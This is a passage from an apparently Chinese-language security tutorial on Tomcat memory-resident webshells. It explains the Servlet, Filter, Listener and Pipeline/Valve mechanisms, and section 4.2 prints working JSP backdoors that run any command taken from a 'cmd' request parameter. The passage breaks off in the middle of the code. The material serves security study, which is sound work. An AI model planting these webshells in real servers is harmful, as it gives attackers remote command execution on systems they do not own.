Engine、Host、Context、Wrapper。</p><p>Engine：实现类为 org.apache.catalina.core.StandardEngine</p><p>Host：实现类为 org.apache.catalina.core.StandardHost</p><p>Context：实现类为 org.apache.catalina.core.StandardContext</p><p>Wrapper：实现类为 org.apache.catalina.core.StandardWrapper</p><p><font style="color:rgb(51, 51, 51);">在Tomcat中Wrapper代表一个独立的servlet实例，StandardWrapper是Wrapper接口的标准实现类（StandardWrapper 的主要任务就是载入Servlet类并且进行实例化），同时其从ContainerBase类继承过来，表示他是一个容器，只是他是最底层的容器，不能再含有任何的子容器了，且其父容器只能是context。而我们在也就是需要在这里去载入我们自定义的Servlet加载我们的内存马。</font></p><h4 id="3-1-3-Tomcat工作机制动画演示"><a href="#3-1-3-Tomcat工作机制动画演示" class="headerlink" title="3.1.3 Tomcat工作机制动画演示"></a><font style="color:rgb(0, 0, 0);">3.1.3 Tomcat工作机制动画演示</font></h4><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508199.gif"></p><h3 id="3-2-Servlet"><a href="#3-2-Servlet" class="headerlink" title="3.2 Servlet"></a>3.2 Servlet</h3><h4 id="3-2-1-什么是servlet"><a href="#3-2-1-什么是servlet" class="headerlink" title="3.2.1 什么是servlet"></a><font style="color:rgb(31, 35, 40);">3.2.1 什么是servlet</font></h4><p><font style="color:rgb(31, 35, 40);">Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。它负责处理用户的请求，并根据请求生成相应的返回信息提供给用户。</font></p><p><strong><font style="color:rgb(31, 35, 40);">servlet 架构：</font></strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508008.jpeg"></p><h4 id="3-2-2-请求的处理过程"><a href="#3-2-2-请求的处理过程" class="headerlink" title="3.2.2 请求的处理过程"></a><font style="color:rgb(31, 35, 40);">3.2.2 请求的处理过程</font></h4><p><font style="color:rgb(31, 35, 40);">客户端发起一个http请求，比如get类型。</font></p><p><font style="color:rgb(31, 35, 40);">Servlet容器接收到请求，根据请求信息，封装成HttpServletRequest 和  HttpServletResponse对象。</font></p><p><font style="color:rgb(31, 35, 40);">Servlet容器调用HttpServlet的init()方法，init方法只在第一次请求的时候被调用。</font></p><p><font style="color:rgb(31, 35, 40);">Servlet容器调用service()方法。</font></p><p><font style="color:rgb(31, 35, 40);">service()方法根据请求类型，这里是get类型，分别调用doGet或者doPost方法，这里调用doGet方法。</font></p><p><font style="color:rgb(31, 35, 40);">doXXX方法中是我们自己写的业务逻辑。</font></p><p><font style="color:rgb(31, 35, 40);">业务逻辑处理完成之后，返回给Servlet容器，然后容器将结果返回给客户端。</font></p><p><font style="color:rgb(31, 35, 40);">容器关闭时候，会调用destory方法</font></p><h4 id="3-2-3-servlet生命周期"><a href="#3-2-3-servlet生命周期" class="headerlink" title="3.2.3 servlet生命周期"></a><font style="color:rgb(31, 35, 40);">3.2.3 servlet生命周期</font></h4><p><font style="color:rgb(31, 35, 40);">1）服务器启动时(web.xml中配置load-on-startup&#x3D;1，默认为0)或者第一次请求该servlet时，就会初始化一个Servlet对象，也就是会执行初始化方法init(ServletConfig conf)。</font></p><p><font style="color:rgb(31, 35, 40);">2）servlet对象去处理所有客户端请求，在service(ServletRequest req，ServletResponse res)方法中执行</font></p><p><font style="color:rgb(31, 35, 40);">3）服务器关闭时，销毁这个servlet对象，执行destroy()方法。</font></p><p><font style="color:rgb(31, 35, 40);">4）由JVM进行垃圾回收。</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508795.png"></p><h3 id="3-3-Filter"><a href="#3-3-Filter" class="headerlink" title="3.3 Filter"></a>3.3 Filter</h3><h4 id="3-3-1-简介"><a href="#3-3-1-简介" class="headerlink" title="3.3.1 简介"></a><font style="color:rgb(31, 35, 40);">3.3.1 简介</font></h4><p><font style="color:rgb(31, 35, 40);">filter也称之为过滤器，是对Servlet技术的一个强补充，其主要功能是在HttpServletRequest到达 Servlet 之前，拦截客户的HttpServletRequest ，根据需要检查HttpServletRequest，也可以修改HttpServletRequest 头和数据；在HttpServletResponse到达客户端之前，拦截HttpServletResponse ，根据需要检查HttpServletResponse，也可以修改HttpServletResponse头和数据。</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508866.png"></p><h4 id="3-3-2-基本工作原理"><a href="#3-3-2-基本工作原理" class="headerlink" title="3.3.2 基本工作原理"></a><font style="color:rgb(31, 35, 40);">3.3.2 基本工作原理</font></h4><p><font style="color:rgb(31, 35, 40);">1、Filter 程序是一个实现了特殊接口的 Java 类，与 Servlet 类似，也是由 Servlet 容器进行调用和执行的。</font></p><p><font style="color:rgb(31, 35, 40);">2、当在 web.xml 注册了一个 Filter 来对某个 Servlet 程序进行拦截处理时，它可以决定是否将请求继续传递给 Servlet 程序，以及对请求和响应消息是否进行修改。</font></p><p><font style="color:rgb(31, 35, 40);">3、当 Servlet 容器开始调用某个 Servlet 程序时，如果发现已经注册了一个 Filter 程序来对该 Servlet 进行拦截，那么容器不再直接调用 Servlet 的 service 方法，而是调用 Filter 的 doFilter 方法，再由 doFilter 方法决定是否去激活 service 方法。</font></p><p><font style="color:rgb(31, 35, 40);">4、但在 Filter.doFilter 方法中不能直接调用 Servlet 的 service 方法，而是调用 FilterChain.doFilter 方法来激活目标 Servlet 的 service 方法，FilterChain 对象时通过 Filter.doFilter 方法的参数传递进来的。</font></p><p><font style="color:rgb(31, 35, 40);">5、只要在 Filter.doFilter 方法中调用 FilterChain.doFilter 方法的语句前后增加某些程序代码，这样就可以在 Servlet 进行响应前后实现某些特殊功能。</font></p><p><font style="color:rgb(31, 35, 40);">6、如果在 Filter.doFilter 方法中没有调用 FilterChain.doFilter 方法，则目标 Servlet 的 service 方法不会被执行，这样通过 Filter 就可以阻止某些非法的访问请求。</font></p><h4 id="3-3-3-filter的生命周期"><a href="#3-3-3-filter的生命周期" class="headerlink" title="3.3.3 filter的生命周期"></a><font style="color:rgb(31, 35, 40);">3.3.3 filter的生命周期</font></h4><p><font style="color:rgb(31, 35, 40);">与servlet一样，Filter的创建和销毁也由web容器负责。web 应用程序启动时，web 服务器将创建Filter 的实例对象，并调用其init方法，读取web.xml配置，完成对象的初始化功能，从而为后续的用户请求作好拦截的准备工作（filter对象只会创建一次，init方法也只会执行一次）。开发人员通过init方法的参数，可获得代表当前filter配置信息的FilterConfig对象。 Filter对象创建后会驻留在内存，当web应用移除或服务器停止时才销毁。在Web容器卸载 Filter 对象之前被调用。该方法在Filter的生命周期中仅执行一次。在这个方法中，可以释放过滤器使用的资源。</font></p><h4 id="3-3-4-filter链"><a href="#3-3-4-filter链" class="headerlink" title="3.3.4 filter链 "></a><font style="color:rgb(31, 35, 40);">3.3.4 filter链 </font></h4><p><font style="color:rgb(31, 35, 40);">当多个filter同时存在的时候，组成了filter链。web服务器根据Filter在web.xml文件中的注册顺序，决定先调用哪个Filter。当第一个Filter的doFilter方法被调用时，web服务器会创建一个代表Filter链的FilterChain对象传递给该方法，通过判断FilterChain中是否还有filter决定后面是否还调用filter。</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508459.png"></p><p><font style="color:rgb(31, 35, 40);"></font></p><h3 id="3-4-Listener"><a href="#3-4-Listener" class="headerlink" title="3.4 Listener"></a><strong><font style="color:rgb(31, 35, 40);">3.4 Listener</font></strong></h3><h4 id="3-4-1-简介"><a href="#3-4-1-简介" class="headerlink" title="3.4.1 简介"></a><font style="color:rgb(31, 35, 40);">3.4.1 简介</font></h4><p><font style="color:rgb(31, 35, 40);">JavaWeb开发中的监听器（Listener）就是Application、Session和Request三大对象创建、销毁或者往其中添加、修改、删除属性时自动执行代码的功能组件。</font></p><p><strong><font style="color:rgb(31, 35, 40);">ServletContextListener</font></strong><font style="color:rgb(31, 35, 40);">：对Servlet上下文的创建和销毁进行监听； </font></p><p><strong><font style="color:rgb(31, 35, 40);">ServletContextAttributeListener</font></strong><font style="color:rgb(31, 35, 40);">：监听Servlet上下文属性的添加、删除和替换；</font></p><p><strong><font style="color:rgb(31, 35, 40);">HttpSessionListener</font></strong><font style="color:rgb(31, 35, 40);">：对Session的创建和销毁进行监听。Session的销毁有两种情况，一个中Session超时，还有一种是通过调用Session对象的invalidate()方法使session失效。</font></p><p><strong><font style="color:rgb(31, 35, 40);">HttpSessionAttributeListener</font></strong><font style="color:rgb(31, 35, 40);">：对Session对象中属性的添加、删除和替换进行监听；</font></p><p><strong><font style="color:rgb(31, 35, 40);">ServletRequestListener</font></strong><font style="color:rgb(31, 35, 40);">：对请求对象的初始化和销毁进行监听； </font></p><p><strong><font style="color:rgb(31, 35, 40);">ServletRequestAttributeListener</font></strong><font style="color:rgb(31, 35, 40);">：对请求对象属性的添加、删除和替换进行监听。</font></p><p><font style="color:rgb(31, 35, 40);"></font></p><p><font style="color:rgb(0, 0, 0);">在应用中可能调用的监听器如下：</font></p><ul><li><font style="color:rgb(0, 0, 0);">ServletContextListener：用于监听整个 Servlet 上下文（创建、销毁）</font></li><li><font style="color:rgb(0, 0, 0);">ServletContextAttributeListener：对 Servlet 上下文属性进行监听（增删改属性）</font></li><li><font style="color:rgb(0, 0, 0);">ServletRequestListener：对 Request 请求进行监听（创建、销毁）</font></li><li><font style="color:rgb(0, 0, 0);">ServletRequestAttributeListener：对 Request 属性进行监听（增删改属性）</font></li><li><font style="color:rgb(0, 0, 0);">javax.servlet.http.HttpSessionListener：对 Session 整体状态的监听</font></li><li><font style="color:rgb(0, 0, 0);">javax.servlet.http.HttpSessionAttributeListener：对 Session 属性的监听</font></li></ul><h4 id="3-4-2-用途"><a href="#3-4-2-用途" class="headerlink" title="3.4.2 用途"></a><font style="color:rgb(31, 35, 40);">3.4.2 用途</font></h4><p><font style="color:rgb(31, 35, 40);">可以使用监听器监听客户端的请求、服务端的操作等。通过监听器，可以自动出发一些动作，比如监听在线的用户数量，统计网站访问量、网站访问监控等。</font></p><h3 id="3-5-Tomcat内存马"><a href="#3-5-Tomcat内存马" class="headerlink" title="3.5 Tomcat内存马"></a>3.5 Tomcat内存马</h3><p>Tomcat内存马大致可以分为三类，分别是Listener型、Filter型、Servlet型。Tomcat内存马的核心原理就是动态地将恶意组件添加到正在运行的Tomcat服务器中。</p><p>而这一技术的实现有赖于官方对Servlet3.0的升级，Servlet在3.0版本之后能够支持动态注册组件。而Tomcat直到7.x才支持Servlet3.0，因此通过动态添加恶意组件注入内存马的方式适合Tomcat7.x及以上。为了便于调试Tomcat，我们先在父项目的pom文件中引入Tomcat依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>9.0.105<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="3-6-Tomcat-的管道机制"><a href="#3-6-Tomcat-的管道机制" class="headerlink" title="3.6 Tomcat 的管道机制"></a>3.6 Tomcat 的管道机制</h3><h4 id="3-6-1-Tomcat中的管道机制"><a href="#3-6-1-Tomcat中的管道机制" class="headerlink" title="3.6.1 Tomcat中的管道机制"></a>3.6.1 Tomcat中的<code>管道机制</code></h4><blockquote><p>我们知道，当Tomcat接收到客户端请求时，首先会使用<code>Connector</code>进行解析，然后发送到<code>Container</code>进行处理。那么我们的消息又是怎么在四类子容器中层层传递，最终送到Servlet进行处理的呢？这里涉及到的机制就是Tomcat管道机制。</p><p>管道机制主要涉及到两个名词，Pipeline（管道）和Valve（阀门）。如果我们把请求比作管道（Pipeline）中流动的水，那么阀门（Valve）就可以用来在管道中实现各种功能，如控制流速等。因此通过管道机制，我们能按照需求，给在不同子容器中流通的请求添加各种不同的业务逻辑，并提前在不同子容器中完成相应的逻辑操作。这里的调用流程可以类比为Filter中的责任链机制</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508670.png"></p><p>在Tomcat中，四大组件Engine、Host、Context以及Wrapper都有其对应的Valve类，StandardEngineValve、StandardHostValve、StandardContextValve以及StandardWrapperValve，他们同时维护一个StandardPipeline实例。</p></blockquote><h4 id="3-6-2-管道机制流程分析"><a href="#3-6-2-管道机制流程分析" class="headerlink" title="3.6.2 管道机制流程分析"></a>3.6.2 管道机制流程分析</h4><p>我们先来看看Pipeline接口，其继承了Contained接口，并且实现了很多对 Valve 的操作方法</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081509796.png"></p><p>跟进查看 Valve 接口：</p><p>其中getNext()方法可以用来获取下一个Valve，Valve的调用过程可以理解成类似Filter中的责任链模式，按顺序调用。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508325.jpeg"></p><p>同时Valve可以通过重写<code>invoke()</code>方法来实现具体的业务逻辑</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081509163.png"></p><p>下面我们通过源码看一看，消息在容器之间是如何传递的。首先消息传递到Connector被解析后，在<code>org.apache.catalina.connector.CoyoteAdapter#service</code>方法中  </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508440.png"></p><p>前面是对Request和Respone对象进行一些判断及创建操作，我们重点来看一下</p><p><code>connector.getService().getContainer().getPipeline().getFirst().invoke(request, response)</code></p><p>首先通过<code>connector.getService()</code>来获取一个StandardService对象</p><p>接着通过<code>StandardService</code>.<code>getContainer().getPipeline()</code>获取<code>StandardPipeline</code>对象。</p><p>再通过<code>StandardPipeline.getFirst()</code>获取第一个Valve</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081508076.png"></p><p> 最后通过调用<code>StandardEngineValve.invoke()</code>来实现Valve的各种业务逻辑  </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081509410.png"></p><p><code>host.getPipeline().getFirst().invoke(request, response)</code>实现调用后续的Valve。  </p><h2 id="4-JSP"><a href="#4-JSP" class="headerlink" title="4. JSP"></a>4. JSP</h2><h3 id="4-1-什么是-JSP："><a href="#4-1-什么是-JSP：" class="headerlink" title="4.1 什么是 JSP："></a>4.1 什么是 JSP：</h3><p>JSP（Java Server Pages），是Java的一种动态网页技术。在早期Java的开发技术中，Java程序员如果想要向浏览器输出一些数据，就必须得手动<code>println</code>一行行的HTML代码。为了解决这一繁琐的问题，Java开发了JSP技术。</p><p>JSP可以看作一个Java Servlet，主要用于实现Java web应用程序的用户界面部分。网页开发者们通过结合HTML代码、XHTML代码、XML元素以及嵌入JSP操作和命令来编写JSP。</p><p>当第一次访问JSP页面时，Tomcat服务器会将JSP页面翻译成一个java文件，并将其编译为.class文件。JSP通过网页表单获取用户输入数据、访问数据库及其他数据源，然后动态地创建网页。</p><h3 id="4-2-恶意类："><a href="#4-2-恶意类：" class="headerlink" title="4.2 恶意类："></a>4.2 恶意类：</h3><h4 id="JSP-的无回显的内存马："><a href="#JSP-的无回显的内存马：" class="headerlink" title="JSP 的无回显的内存马："></a><font style="color:rgb(80, 80, 92);">JSP 的无回显的内存马：</font></h4><p>最简单的 JSP 命令执行后门，但是命令执行的输出流（InputStream）未被读取或写回 HTTP 响应所以无回显。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;% Runtime.getRuntime().exec(request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>));%&gt;<br></code></pre></td></tr></table></figure><p>改进为带回显：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%<br><span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br><span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>    <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();<br>    <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>    out.println(output);<br>&#125;<br>%&gt;<br></code></pre></td></tr></table></figure><h4 id="有回显的-Filter-木马："><a href="#有回显的-Filter-木马：" class="headerlink" title="有回显的 Filter 木马："></a><font style="color:rgb(80, 80, 92);">有回显的 Filter 木马：</font></h4><p><font style="color:rgb(80, 80, 92);"></font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.InputStream&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.util.Scanner&quot;</span> %&gt;<br>  <br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShellFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> (HttpServletRequest) request;<br>            <span class="hljs-type">HttpServletResponse</span> <span class="hljs-variable">resp</span> <span class="hljs-operator">=</span> (HttpServletResponse) response;<br>            <span class="hljs-keyword">if</span> (req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">boolean</span> <span class="hljs-variable">isLinux</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">osTyp</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>);<br>                <span class="hljs-keyword">if</span> (osTyp != <span class="hljs-literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                    isLinux = <span class="hljs-literal">false</span>;<br>                &#125;<br>                String[] cmds = isLinux ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)&#125; : <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)&#125;;<br>                <span class="hljs-type">InputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();<br>                <span class="hljs-type">Scanner</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(in).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                <span class="hljs-type">String</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> s.hasNext() ? s.next() : <span class="hljs-string">&quot;&quot;</span>;<br>                resp.getWriter().write(output);<br>                resp.getWriter().flush();<br>            &#125;<br>            chain.doFilter(request, response);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig config)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>        &#125;<br><br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><h4 id="有回显的-Servlet-木马："><a href="#有回显的-Servlet-木马：" class="headerlink" title="有回显的 Servlet 木马："></a>有回显的 Servlet 木马：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.*&quot;</span> %&gt;<br><br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MemServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>        <span class="hljs-keyword">private</span> String message;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>            message = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-comment">// 计算机弹出</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        &#125;<br><br>        <span class="hljs-comment">// MemShell?cmd=whoami  任意命令执行</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">service</span><span class="hljs-params">(ServletRequest req, ServletResponse res)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd !=<span class="hljs-literal">null</span>)&#123;<br>                <span class="hljs-keyword">try</span>&#123;<br><br>                    <span class="hljs-type">Process</span> <span class="hljs-variable">process</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(cmd);<br>                    <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> process.getInputStream();<br>                    <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">bufferedReader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(inputStream));<br>                    String line;<br>                    <span class="hljs-keyword">while</span> ((line = bufferedReader.readLine()) != <span class="hljs-literal">null</span>)&#123;<br>                        res.getWriter().println(line);<br>                    &#125;<br>                &#125;<span class="hljs-keyword">catch</span> (IOException e)&#123;<br>                    e.printStackTrace();<br>                &#125;<span class="hljs-keyword">catch</span> (NullPointerException n)&#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>%&gt;<br></code></pre></td></tr></table></figure><h4 id="无回显的-Listener-木马："><a href="#无回显的-Listener-木马：" class="headerlink" title="无回显的 Listener 木马："></a>无回显的 Listener 木马：</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java">&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.lang.reflect.Field&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;<br>&lt;%@ page <span class="hljs-keyword">import</span>=<span class="hljs-string">&quot;java.io.IOException&quot;</span> %&gt;<br>&lt;%--<br>  Created by IntelliJ IDEA.<br>  User: XVSHIFU<br>  Date: <span class="hljs-number">2025</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2</span><br>  Time: <span class="hljs-number">16</span>:<span class="hljs-number">24</span><br>  To change <span class="hljs-built_in">this</span> template use File | Settings | File Templates.<br>--%&gt;<br>&lt;%@ page contentType=<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="hljs-string">&quot;java&quot;</span> %&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>    &lt;title&gt;Title&lt;/title&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br><br>&lt;%!<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShellListener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletRequestListener</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> &#123;<br>            <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">request</span> <span class="hljs-operator">=</span> (HttpServletRequest) sre.getServletRequest();<br>            <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>);<br>            <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    Runtime.getRuntime().exec(cmd);<br>                &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>                    e.printStackTrace();<br>                &#125; <span class="hljs-keyword">catch</span> (NullPointerException n) &#123;<br>                    n.printStackTrace();<br>                &#125;<br>            &#125;<br>         &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent 